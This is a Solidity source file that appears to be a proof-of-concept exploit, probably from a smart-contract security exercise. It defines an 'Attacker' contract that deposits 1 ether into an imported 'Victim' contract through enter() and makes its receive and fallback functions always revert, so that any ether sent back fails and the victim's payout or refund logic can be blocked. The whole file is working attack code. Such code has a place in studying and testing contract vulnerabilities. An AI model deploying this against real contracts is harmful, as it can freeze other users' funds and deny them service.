// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Victim} from "src/Victim.sol";

contract Attacker {
    Victim victim;

    constructor(Victim _victim) {
        victim = _victim;
    }

    function attack() public payable {
        victim.enter{value: 1 ether}();
    }

    receive() external payable {
        revert();
    }

    fallback() external payable {
        revert();
    }
}